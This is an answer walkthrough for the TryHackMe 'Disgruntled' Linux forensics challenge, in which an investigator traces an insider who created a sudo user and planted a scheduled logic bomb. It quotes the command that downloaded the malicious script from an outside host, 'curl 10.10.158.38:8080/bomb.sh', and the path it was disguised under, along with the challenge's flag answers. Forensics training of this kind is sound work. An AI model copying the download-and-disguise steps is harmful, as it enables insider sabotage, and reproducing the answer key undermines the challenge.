# Digital Forensics and Incident Response
## Challenge - [Disgruntled](https://tryhackme.com/r/room/disgruntled)

> Use your Linux forensics knowledge to investigate an incident.<br><br> Description: An employee from the IT department of one of our clients (CyberT) got arrested by the police. The guy was running a successful phishing operation as a side gig. CyberT wants us to check if this person has done anything malicious to any of their assets. 

### Which user was created after the package from the previous task was installed?

![Adduser](https://github.com/user-attachments/assets/1b2d30b2-5e44-4bae-8f6b-bb5562c812e9)

__Answer: it-admin__

### A user was then later given sudo priveleges. When was the sudoers file updated? 

![Sudo Privilege Date](https://github.com/user-attachments/assets/1d4ec918-d61a-4868-844f-bd6f4f5d1971)

__Answer: Dec 28 06:27:34__


### A script file was opened using the "vi" text editor. What is the name of this file?

![Fine Name](https://github.com/user-attachments/assets/f74a5bab-08df-4cdd-b60c-d58b5dc8657b)

__Answer: bomb.sh__


### What is the command used that created the file bomb.sh?

![Command for bomb sh](https://github.com/user-attachments/assets/367520fb-62ef-4b71-8cf6-1b618748ef7a)

__Answer: curl 10.10.158.38:8080/bomb.sh --output bomb.sh__


### The file was renamed and moved to a different directory. What is the full path of this file now?

![Renamed as](https://github.com/user-attachments/assets/efc4968a-ac40-494d-8fa6-16a2300ac58e)

__Answer: /bin/os-update.sh__


### What is the name of the file that will get created when the file from the first question executes?

![File created when executes](https://github.com/user-attachments/assets/c5655f90-43e9-4d11-ab87-d5334ded2a15)

__Answer: goodby.txt__


### At what time will the malicious file trigger? (Format: HH:MM AM/PM) 

![Time it will excute](https://github.com/user-attachments/assets/b42880f7-fd83-4545-ad45-02f5b85b2ef5)

__Answer: 08:00 AM__
